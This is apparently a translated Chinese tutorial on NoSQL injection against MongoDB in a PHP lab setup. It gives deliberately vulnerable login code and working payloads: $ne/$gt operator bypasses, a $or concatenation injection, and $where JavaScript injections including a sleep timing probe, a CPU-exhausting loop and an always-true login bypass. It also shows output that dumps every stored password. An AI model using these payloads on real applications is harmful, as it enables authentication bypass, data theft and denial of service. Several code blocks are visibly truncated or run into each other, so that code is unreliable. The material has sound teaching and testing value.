# Nosql 注入学习总结
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Nosql 注入的简介
NoSQL 注入由于 NoSQL 本身的特性和传统的 SQL
注入有所区别。使用传统的SQL注入，攻击者利用不安全的用户输入来修改或替换应用程序发送到数据库引擎的 SQL 查询语句（或其他SQL语句）。  
换句话说，SQL 注入使攻击者可以在数据库中 SQL 执行命令。
与关系数据库不同，NoSQL 数据库不使用通用查询语言。NoSQL
查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java
等。这意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令，这可能更加危险。
以下是 OWASP 对于 Nosql 注入的介绍：
> NoSQL databases provide looser consistency restrictions than traditional SQL
> databases. By requiring fewer relational constraints and consistency checks,
> NoSQL databases often offer performance and scaling benefits. Yet these
> databases are still potentially vulnerable to injection attacks, even if
> they aren’t using the traditional SQL syntax. Because these NoSQL injection
> attacks may execute within a [procedural
> language](https://en.wikipedia.org/wiki/Procedural_programming), rather than
> in the [declarative SQL
> language](https://en.wikipedia.org/wiki/Declarative_programming), the
> potential impacts are greater than traditional SQL injection.
>
> NoSQL database calls are written in the application’s programming language,
> a custom API call, or formatted according to a common convention (such as
> `XML`, `JSON`, `LINQ`, etc). Malicious input targeting those specifications
> may not trigger the primarily application sanitization checks. For example,
> filtering out common HTML special characters such as ` & ;` will not
> prevent attacks against a JSON API, where special characters include `/ { }
> :`.
## NoSQL 注入的分类
有两种 NoSQL 注入分类的方式：
第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。
第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。
  * **重言式注入**
又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。
  * **联合查询注入**
联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。
  * **JavaScript 注入**
MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的
JavaScript 代码，导致非法的数据获取或篡改。
  * **盲注**
当页面没有回显时，那么我们可以通过 `$regex` 正则表达式来达到和传统 SQL 注入中 `substr()` 函数相同的功能，而且 NoSQL
用到的基本上都是布尔盲注。
下面我们便通过 PHP 和 Nodejs 来讲解 MongoDB 注入的利用方式。
## PHP 中的 MongoDB 注入
**测试环境如下：**
  * Ubuntu
  * PHP 7.4.21
  * MongoDB Server 4.4.7
在 PHP 中使用 MongoDB 你必须使用 MongoDB 的 PHP
驱动： 。这里我们使用新版的 PHP 驱动来操作 MongoDB。一下实例均以
POST 请求方式为例。
###  重言式注入
首先在 MongoDB 中选中 test 数据库，创建一个 users 集合并插入文档数据：
    > use test
    switched to db test
    >
    > db.createCollection('users')
    { "ok" : 1 }
    >
    > db.users.insert({username: 'admin', password: '123456'})
    WriteResult({ "nInserted" : 1 })
    > db.users.insert({username: 'whoami', password: '657260'})
    WriteResult({ "nInserted" : 1 })
    > db.users.insert({username: 'bunny', password: '964795'})
    WriteResult({ "nInserted" : 1 })
    > db.users.insert({username: 'bob', password: '965379'})
    WriteResult({ "nInserted" : 1 })
    >
然后编写 index.php：
     $username,
        'password' => $password
    ));
    $result = $manager->executeQuery('test.users', $query)->toArray();
    $count = count($result);
    if ($count > 0) {
        foreach ($result as $user) {
            $user = ((array)$user);
            echo '====Login Success====';
            echo 'username:' . $user['username'] . '';
            echo 'password:' . $user['password'] . '';
        }
    }
    else{
        echo 'Login Failed';
    }
    ?>
如下，当正常用户想要登陆 whoami 用户时，POST 方法提交的数据如下：
    username=whoami&password=657260
进入 PHP 后的程序数据如下：
    array(
        'username' => 'whoami',
        'password' => '657260'
    )
进入 MongoDB 后执行的查询命令为：
    > db.users.find({'username':'whoami', 'password':'657260'})
    { "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
我们从代码中可以看出，这里对用户输入没有做任何过滤与校验，那么我们可以通过 `$ne` 关键字构造一个永真的条件就可以完成 NoSQL 注入：
    username[$ne]=1&password[$ne]=1
如下图所示，成功查出所有的用户信息，说明成功注入了一个永真查询条件：
提交的数据进入 PHP 后的数据如下：
    array(
        'username' => array('$ne' => 1),
        'password' => array('$ne' => 1)
    )
进入 MongoDB 后执行的查询命令为：
    > db.users.find({'username':{$ne:1}, 'password':{$ne:1}})
    { "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
    { "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
    { "_id" : ObjectId("60fa9c85257f18542b68c4ba"), "username" : "bunny", "password" : "964795" }
    { "_id" : ObjectId("60fa9c88257f18542b68c4bb"), "username" : "bob", "password" : "965379" }
由于 users 集合中 username 和 password 都不等于 1，所以将所有的文档数据查出，这很可能是真实的，并且可能允许攻击者绕过身份验证。
对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们发送 `value=1` 那么，也就是发送了一个 `value` 的值为 1
的数据。如果发送 `value[$ne]=1` 则 PHP 会将其转换为数组 `value=array($ne=>1)`，当数据到了进入 MongoDB
后，原来一个单一的 `{"value":1}` 查询就变成了一个 `{"value":{$ne:1}` 条件查询。同样的，我们也可以使用下面这些作为
payload 进行攻击：
    username[$ne]=&password[$ne]=
    username[$gt]=&password[$gt]=
    username[$gte]=&password[$gte]=
这种重言式注入的方式也是我们通常用来验证网站是否存在 NoSQL 注入的第一步。不仅是 `$ne`，只要可以构造用真条件就可以。
###  联合查询注入
在 MongoDB 之类的流行数据存储中，JSON 查询结构使得联合查询注入攻击变得比较复杂了，但也是可以实现的。
我们都知道，直接对 SQL 查询语句进行字符拼接串容易造成 SQL 注入，NoSQL 也有类似问题。如下实例，假设后端的 MongoDB
查询语句使用了字符串拼接：
    string query = "{ username: '" + $username + "', password: '" + $password + "' }"
当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：
    {'username':'admin', 'password':'123456'}
如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：
    username=admin', $or: [ {}, {'a': 'a&password=' }], $comment: '123456
拼接入查询语句后相当于执行了：
    { username: 'admin', $or: [ {}, {'a':'a', password: '' }], $comment: '123456'}
此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：
    select * from logins where username = 'admin' and (password true<> or ('a'='a' and password = ''))
这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 `()` 内的条件总是永真的。
但是现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query
对象了，因此这用注入方法简单了解一下就好了。
###  JavaScript 注入
MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行
JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改。
**$where 操作符**
首先我们需要了解一下 `$where` 操作符。在 MongoDB 中，`$where` 操作符可以用来执行 JavaScript 代码，将
JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。在 MongoDB 2.4 之前，通过 `$where` 操作符使用
`map-reduce`、`group` 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如
`db`，也就是说可以在自定义的函数里获取数据库的所有信息。
如下实例：
    > db.users.find({ $where: "function(){return(this.username == 'whoami')}" })
    { "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
    >
由于使用了 `$where` 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami
的数据。
某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 `$userData` 获取查询条件：
    db.users.find({ $where: "function(){return(this.username == $userData)}" })
然后，攻击者可能会注入一种恶意的字符串如 `'a'; sleep(5000)` ，此时 MongoDB 执行的查询语句为：
    db.users.find({ $where: "function(){return(this.username == 'a'; sleep(5000))}" })
如果此时服务器有 5 秒钟的延迟则说明注入成功。
此外还有一个类似于 DOS 攻击的方式，可以让服务器 CPU 飙升到 100% 持续 5 秒：
    db.users.find({ $where: "(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date "function() {if(this.username == '".$username."' && this.password == '".$password."') {return true;}}"
    ));
    $result = $manager->executeQuery('test.users', $query)->toArray();
    $count = count($result);
    if ($count>0) {
        foreach ($result as $user) {
            $user=(array)$user;
            echo '====Login Success====';
            echo 'username: '.$user['username']."";
            echo 'password: '.$user['password']."";
        }
    }
    else{
        echo 'Login Failed';
    }
    ?>
如果此时我们发送以下这几种数据，便可以构造出相当于万能密码的效果：
    username='||1) {return true;}})//&password=123456
如下图所示，成功查出所有的用户信息：
这是因为发送 payload 进入 PHP 后的数据如下：
    array(
        '$where' => "
        function() {
            if(this.username == ''||1) {return true;}})//' && this.password == '123456') {
                return true;
            }
        }
    ")
进入 MongoDB 后执行的查询命令为：
    > db.users.find({ $where: "function() {if(this.username == ''||1) {return true;}})//' && this.password == '123456') {return true;}}" })
    { "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
    { "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
    { "_id" : ObjectId("60fa9c85257f18542b68c4ba"), "username" : "bunny", "password" : "964795" }
    { "_id" : ObjectId("60fa9c88257f18542b68c4bb"), "username" : "bob", "password" : "965379" }
    >
我们从代码中可以看出，password 中的 `return true` 使得整个 JavaScript 代码提前结束并返回了
`true`，这样就构造出了一个永真的条件并完成了 NoSQL 注入。